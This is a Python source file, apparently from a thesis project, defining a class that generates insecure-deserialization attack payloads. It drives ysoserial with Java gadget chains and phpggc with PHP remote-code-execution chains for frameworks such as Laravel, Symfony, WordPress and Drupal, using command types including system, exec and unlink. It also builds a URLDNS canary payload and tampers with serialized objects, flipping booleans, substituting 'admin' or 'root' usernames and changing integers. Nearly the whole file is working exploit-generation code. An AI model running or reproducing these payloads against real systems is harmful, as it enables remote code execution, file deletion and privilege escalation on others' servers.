import subprocess
import base64
import os
import re

class PayloadMutation:

    YSOSERIAL_PATH = "D:\\Thesis\\Analyze\\third_tool\\java\\ysoserial-all.jar"

    TEST_COMMANDS = ["id", "whoami", "hostname"]

    JAVA_CHAIN_MAP = {
        "CommonsCollections": [
            "CommonsCollections6",
            "CommonsCollections1",
            "CommonsCollections4",
        ],
        "TemplatesImpl": [
            "Jdk7u21",
            "CommonsCollections4",
        ],
        "Spring": [
            "Spring1",
            "Spring2",
        ],
        "Groovy": [
            "Groovy1",
        ],
        "JNDI": [
            "CommonsCollections6",
            "Spring1",
        ],
    }

    def __init__(self, exploit_result: dict, vector: dict) -> None:
        self.exploit = exploit_result
        self.vector  = vector
        self.probe   = exploit_result.get("suggested_probe", "")
        self.etype   = exploit_result.get("exploit_type", "")

    def mutate(self) -> list[dict]:
        if self.probe == "ysoserial":
            return self._mutate_java()
        if self.probe == "urldns_probe":
            return self._mutate_java_urldns()
        if self.probe == "gadget_chain":
            return self._php_mutation()
        if self.probe in ("flip_boolean", "modify_string","modify_integer"):  
            return self.__mutated_php_choose()
        return []


    def _resolve_chains(self) -> list[str]:
        for key, chains in self.JAVA_CHAIN_MAP.items():
            if key.lower() in self.etype.lower():
                return chains
        return ["CommonsCollections6", "CommonsCollections1", "Spring1"]

    def _get_java_flags(self) -> list[str]:
        try:
            result = subprocess.run(
                ["java", "-version"],
                capture_output=True,
                text=True
            )
            output = result.stderr + result.stdout
            if '"1.' in output:
                return []   
            return [
                "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
                "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
                "--add-opens=java.base/java.net=ALL-UNNAMED",
                "--add-opens=java.base/java.util=ALL-UNNAMED",
                "--add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED",
            ]
        except Exception:
            return []

    def _run_ysoserial(self, chain: str, command: str) -> str | None:
        if not os.path.exists(self.YSOSERIAL_PATH):
            return None
        try:
            flags = self._get_java_flags()
            cmd   = ["java"] + flags + ["-jar", self.YSOSERIAL_PATH, chain, command]

            result = subprocess.run(
                cmd,
                capture_output=True,
                timeout=15
            )

            if result.returncode == 0 and result.stdout:
                return base64.b64encode(result.stdout).decode()

            return None

        except subprocess.TimeoutExpired:
            print(f"[!] Timeout: {chain}")
            return None
        except FileNotFoundError:
            print("[!] java not found")
            return None

    def _make_payload(self, ptype, chain, command, b64) -> dict:
        
        url_safe = b64.replace('+', '%2B').replace('=', '%3D').replace('/', '%2F')

        return {
            "type":              ptype,
            "chain":             chain,
            "command":           command,
            "payload":           b64,          
            "payload_urlencoded": url_safe,   
            "location":          self.vector.get("location"),
            "name":              self.vector.get("name"),
            "url":               self.vector.get("url"),
            "encoding":          "base64",
        }

    def _mutate_java(self) -> list[dict]:
        results = []
        chains  = self._resolve_chains()

        if not os.path.exists(self.YSOSERIAL_PATH):
            return [{
                "error":   "ysoserial-all.jar not found",
                "hint":    f"Place ysoserial-all.jar at: {os.path.abspath(self.YSOSERIAL_PATH)}",
                "command": f"java -jar ysoserial-all.jar {chains[0]} 'id' > payload.ser"
            }]

        for chain in chains:
            for cmd in self.TEST_COMMANDS:
                print(f"[*] Trying {chain} → {cmd}")
                b64 = self._run_ysoserial(chain, cmd)
                if b64:
                    results.append(self._make_payload("java_deser", chain, cmd, b64))
                    print(f"[+] Generated: {chain}")
                else:
                    print(f"[-] Failed: {chain}")

        return results


    def _mutate_java_urldns(self) -> list[dict]:
        if not os.path.exists(self.YSOSERIAL_PATH):
            return [{
                "error": "ysoserial-all.jar not found",
                "hint":  "java -jar ysoserial-all.jar URLDNS 'http://YOUR_CANARY' | base64"
            }]

        canary = "http://canary.REPLACE_WITH_YOUR_INTERACTSH_DOMAIN.com"
        b64    = self._run_ysoserial("URLDNS", canary)

        if b64:
            payload = self._make_payload("java_urldns", "URLDNS", canary, b64)
            payload["note"] = "Replace canary domain with your interactsh or burp collaborator URL"
            return [payload]

        return []
    
    
    ##PHP
    
    PHPGGC_PATH = "D:\\Thesis\\Analyze\\third_tool\\phpggc"
    
    PHP_GADGET_CHAINS_MAP = {
    "monolog": [
        "Monolog/FW1",
        "Monolog/RCE1",
        "Monolog/RCE2",
        "Monolog/RCE3",
        "Monolog/RCE4",
        "Monolog/RCE5",
        "Monolog/RCE6",
        "Monolog/RCE7",
        "Monolog/RCE8",
        "Monolog/RCE9",
    ],
    "guzzle": [
        "Guzzle/FW1",
        "Guzzle/INFO1",
        "Guzzle/RCE1",
    ],
    "swiftmailer": [
        "SwiftMailer/FD1",
        "SwiftMailer/FD2",
        "SwiftMailer/FR1",
        "SwiftMailer/FW1",
        "SwiftMailer/FW2",
        "SwiftMailer/FW3",
        "SwiftMailer/FW4",
    ],
    "laravel": [
        "Laravel/FD1",
        "Laravel/RCE1",
        "Laravel/RCE2",
        "Laravel/RCE3",
        "Laravel/RCE4",
        "Laravel/RCE5",
        "Laravel/RCE6",
        "Laravel/RCE7",
        "Laravel/RCE8",
        "Laravel/RCE9",
        "Laravel/RCE10",
        "Laravel/RCE11",
        "Laravel/RCE12",
        "Laravel/RCE13",
        "Laravel/RCE14",
        "Laravel/RCE15",
        "Laravel/RCE16",
        "Laravel/RCE17",
        "Laravel/RCE18",
        "Laravel/RCE19",
        "Laravel/RCE20",
        "Laravel/RCE21",
        "Laravel/RCE22",
    ],
    "symfony": [
        "Symfony/FD1",
        "Symfony/FW1",
        "Symfony/FW2",
        "Symfony/RCE1",
        "Symfony/RCE2",
        "Symfony/RCE3",
        "Symfony/RCE4",
        "Symfony/RCE5",
        "Symfony/RCE6",
        "Symfony/RCE7",
        "Symfony/RCE8",
        "Symfony/RCE9",
        "Symfony/RCE10",
        "Symfony/RCE11",
        "Symfony/RCE12",
        "Symfony/RCE13",
        "Symfony/RCE14",
        "Symfony/RCE15",
        "Symfony/RCE16",
    ],
    "yii": [
        "Yii/RCE1",
        "Yii/RCE2",
        "Yii2/RCE1",
        "Yii2/RCE2",
    ],
    "zend": [
        "ZendFramework/FD1",
        "ZendFramework/RCE1",
        "ZendFramework/RCE2",
        "ZendFramework/RCE3",
        "ZendFramework/RCE4",
        "ZendFramework/RCE5",
    ],
    "codeigniter": [
        "CodeIgniter4/FD1",
        "CodeIgniter4/FD2",
        "CodeIgniter4/FR1",
        "CodeIgniter4/RCE1",
        "CodeIgniter4/RCE2",
        "CodeIgniter4/RCE3",
        "CodeIgniter4/RCE4",
        "CodeIgniter4/RCE5",
        "CodeIgniter4/RCE6",
    ],
    "slim": [
        "Slim/RCE1",
    ],
    "wordpress": [
        "WordPress/RCE1",
        "WordPress/RCE2",
        "WordPress/Dompdf/RCE1",
        "WordPress/Dompdf/RCE2",
        "WordPress/Guzzle/RCE1",
        "WordPress/Guzzle/RCE2",
        "WordPress/P/WooCommerce/RCE1",
        "WordPress/P/WooCommerce/RCE2",
        "WordPress/P/YoastSEO/FW1",
    ],
    "drupal": [
        "Drupal/AT1",
        "Drupal/FD1",
        "Drupal/RCE1",
        "Drupal/SQLI1",
        "Drupal/SSRF1",
        "Drupal/XXE1",
        "Drupal7/FD1",
        "Drupal7/RCE1",
        "Drupal7/SQLI1",
        "Drupal7/SSRF1",
        "Drupal9/RCE1",
    ],
    "joomla": [
        "Joomla/FW1",
    ],
    "doctrine": [
        "Doctrine/FW1",
        "Doctrine/FW2",
        "Doctrine/RCE1",
        "Doctrine/RCE2",
    ],
    "thinkphp": [
        "ThinkPHP/FW1",
        "ThinkPHP/FW2",
        "ThinkPHP/RCE1",
        "ThinkPHP/RCE2",
        "ThinkPHP/RCE3",
        "ThinkPHP/RCE4",
    ],
    "typo3": [
        "Typo3/FD1",
    ],
    "cakephp": [
        "CakePHP/RCE1",
        "CakePHP/RCE2",
    ],
    "magento": [
        "Magento/FW1",
        "Magento/SQLI1",
        "Magento2/FD1",
        "Magento2/FD2",
    ],
}
    PHP_TYPE = {
        "system",
        "exec",
        "passthru",
        "unlink"
    }
    
    
    def _get_php_version(self) -> str:
        try:
            result = subprocess.run(["php", "-version"], capture_output=True, text=True)
            output = result.stdout + result.stderr
            if "PHP 5." in output: return "5"
            if "PHP 7." in output: return "7"
            if "PHP 8." in output: return "8"
            return "unknown"
        except Exception:
            return "unknown"
        
    def _php_mutation(self) -> list[dict]:
        results = []
        
        chains = self.__resolve_php_chain()
        if not os.path.exists(self.PHPGGC_PATH):
            return [{
                "error": "phpggc not found",
                "hint":  f"Place phpggc at: {self.PHPGGC_PATH}"
            }] 
        for chain in chains:
            for ptype in self.PHP_TYPE:
                for cmd in self.TEST_COMMANDS:
                    result = self._run_phpggc(chain, ptype, cmd)
                    if result:
                        results.append(self._make_payload("php_object", chain, cmd, result))
                        print(f"[+] Generated: {chain}")
                        
        return results
    
    
    def _run_phpggc(self, chain: str,type:str, command: str) -> str | None:
        try:
            cmd   = ["php"]  + [self.PHPGGC_PATH, chain,type, command,"-b"]
            result = subprocess.run(cmd, capture_output=True, timeout=15)

            if result.returncode == 0 and result.stdout:
                return result.stdout.decode().strip() 
            return None 
        except subprocess.TimeoutExpired:
            print(f"[!] Timeout: {chain}")
            return None
        except FileNotFoundError:
            print("[!] php not found")
            return None
        
    def __resolve_php_chain(self) -> list[str]:
        for key, chain in self.PHP_GADGET_CHAINS_MAP.items():
            if key.lower() in self.etype.lower() and chain:
                return chain
        return ["Monolog/RCE1", "Laravel/RCE1", "Symfony/RCE1"]
    
    
    def __flip_boolean(self, payload: str) -> list[dict]:
        results = []
        if "b:0" in payload:
            mutated = payload.replace("b:0", "b:1")
            encode_mutatedd = base64.b64encode(mutated.encode()).decode()
            results.append(self._make_payload("flip_boolean", None, None,encode_mutatedd ))
            
        if "b:1" in payload:
            mutated1 = payload.replace("b:1", "b:0")
            encode_mutatedd1 = base64.b64encode(mutated1.encode()).decode()
            results.append(self._make_payload("flip_boolean", None, None,encode_mutatedd1 ))
            
        return results
    
    def __modify_string(self, payload: str) -> list[dict]:
        results = []
        test_values = ["administrator", "admin", "root", "superuser"]
        
        for m in re.finditer(r's:(\d+):"([^"]+)"', payload):
            declared_len = int(m.group(1))
            original_val = m.group(2)

            all_hints = [
                "username", "user", "email", "login", "name",
                "role", "admin", "level", "access", "privilege"
            ]
            if not any(hint in payload[max(0, m.start()-20):m.start()].lower()
                    for hint in all_hints):
                continue

            for new_val in test_values:
                if new_val == original_val:
                    continue
                new_len = len(new_val)
                new_str = f's:{new_len}:"{new_val}"'
                mutated = payload.replace(m.group(0), new_str, 1)
                encode_mutated = base64.b64encode(mutated.encode()).decode()
                results.append(self._make_payload("modify_string", None, None,encode_mutated))
            
        
        return results
    
    def _mutate_integer(self, payload: str) -> list[dict]:
        results    = []
        int_values = [1, 2, 99, 100, 9999]

        import re
        for m in re.finditer(r'i:(\d+);', payload):
            original_val = int(m.group(1))
            for new_val in int_values:
                if new_val == original_val:
                    continue
                mutated2 = payload.replace(m.group(0), f'i:{new_val};', 1)
                encode_mutated2 = base64.b64encode(mutated2.encode()).decode()
                results.append(self._make_payload("modify_integer", None, None,encode_mutated2))

        return results
        
        
        
    def __mutated_php_choose(self) -> list[dict]:
        results = []
        origin = self.vector.get("value", "")
        if self.probe == "flip_boolean":
            results += self.__flip_boolean(origin)
        if self.probe == "modify_integer":
            results += self._mutate_integer(origin)
        if self.probe == "modify_string":
            results += self.__modify_string(origin)
            
        return results
